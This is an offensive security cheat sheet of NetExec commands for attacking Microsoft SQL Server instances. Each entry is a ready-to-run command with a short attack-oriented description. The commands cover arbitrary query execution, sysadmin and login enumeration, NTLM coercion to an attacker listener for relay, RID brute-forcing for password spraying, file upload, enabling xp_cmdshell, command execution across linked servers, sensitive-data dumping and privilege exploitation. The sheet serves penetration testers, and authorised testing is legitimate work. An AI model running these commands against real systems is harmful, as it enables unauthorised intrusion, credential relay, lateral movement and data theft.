# NetExec MSSQL

## nxc mssql

### MSSQL Query

Run an arbitrary T-SQL query against an MSSQL instance using the authenticated principal.

```sh title:"Execute any T-SQL string against the instance"
nxc mssql $domain -u $user $auth_flags -q $query
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var query
-->

### MSSQL sysadmin members

List members of the `sysadmin` fixed server role - those accounts can execute `xp_cmdshell` and reach OS code execution.

```sh title:"sp_helpsrvrolemember finds xp_cmdshell capable accounts"
nxc mssql $domain -u $user $auth_flags -q "EXEC sp_helpsrvrolemember 'sysadmin';"
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### MSSQL logins

Enumerate all SQL logins on the instance to find misconfigured accounts and potential lateral movement targets.

```sh title:"enum_logins module finds lateral movement candidates"
nxc mssql $domain -u $user $auth_flags -M enum_logins
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### MSSQL Coercion

Trigger MSSQL to authenticate outbound to your listener (e.g. for ntlmrelayx). Works via `xp_dirtree` / `xp_fileexist` style UNC coercion.

```sh title:"xp_dirtree/xp_fileexist UNC trick to your listener"
nxc mssql $domain -u $user $auth_flags -M mssql_coerce -o LISTENER=$lhost
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var lhost
-->

### MSSQL databases

List all databases on the MSSQL instance - useful first step for data exfil and privesc via cross-database chaining.

```sh title:"SELECT from master.dbo.sysdatabases"
nxc mssql $domain -u $user $auth_flags -q 'SELECT name FROM master.dbo.sysdatabases;'
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### Upload file to remote host

Upload a local file to the MSSQL server filesystem via the SQL service account (requires appropriate privileges).

```sh title:"--put-file writes via SQL service account privileges"
nxc mssql $domain -u $user $auth_flags --put-file $local_file_path $remote_file_path
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var local_file_path
var remote_file_path
-->

### Get user SIDs via MSSQL

RID-bruteforce up to 3000 and extract only user SIDs - handy when you have SQL auth but need domain usernames for spraying.

```sh title:"RID-brute to 3000 via MSSQL, filter SidTypeUser"
nxc mssql $domain -u $user $auth_flags --rid-brute 3000 | grep SidTypeUser | awk {'print $6'}
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->


## nxc mssql modules

### enum_impersonate

List MSSQL users with impersonation privileges. Often a fast route from low-priv login to sysadmin.

```sh title:"List MSSQL users with IMPERSONATE privileges"
nxc mssql $domain -u $user $auth_flags -M enum_impersonate
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### enum_links

Enumerate linked SQL servers and their login configs. Linked-server hops chain across DB hosts.

```sh title:"Linked SQL servers + login configs (chain hops)"
nxc mssql $domain -u $user $auth_flags -M enum_links
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### mssql_cbt

Check whether Channel Binding (EPA) is enforced on the MSSQL instance. Disabled CBT enables NTLM relay to MSSQL.

```sh title:"Check Channel Binding (EPA) for MSSQL relay path"
nxc mssql $domain -u $user $auth_flags -M mssql_cbt
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### mssql_dumper

Search every database for sensitive data patterns.

```sh title:"Search every DB for sensitive data patterns"
nxc mssql $domain -u $user $auth_flags -M mssql_dumper
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### enable_cmdshell

Enable (or disable) `xp_cmdshell` on the SQL server. Required before using OS shell primitives.

```sh title:"Enable / disable xp_cmdshell on SQL server"
nxc mssql $domain -u $user $auth_flags -M enable_cmdshell -o ACTION=enable
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### exec_on_link

Execute a command on a linked SQL server. Lateral SQL execution across the link graph.

```sh title:"Execute command on linked SQL server (lateral SQL)"
nxc mssql $domain -u $user $auth_flags -M exec_on_link -o LINK=$link CMD=$cmd
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var link
var cmd
-->

### link_enable_cmdshell

Enable / disable `xp_cmdshell` on a linked MSSQL server.

```sh title:"Toggle xp_cmdshell on a linked MSSQL server"
nxc mssql $domain -u $user $auth_flags -M link_enable_cmdshell -o LINK=$link ACTION=enable
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var link
-->

### link_xpcmd

Run `xp_cmdshell` commands on a linked SQL server.

```sh title:"Run xp_cmdshell on a linked SQL server"
nxc mssql $domain -u $user $auth_flags -M link_xpcmd -o LINK=$link CMD=$cmd
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var link
var cmd
-->

### mssql_priv

Enumerate and exploit MSSQL-side privileges (impersonate, EXECUTE AS, db_owner abuse).

```sh title:"Enumerate + exploit MSSQL privileges"
nxc mssql $domain -u $user $auth_flags -M mssql_priv
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

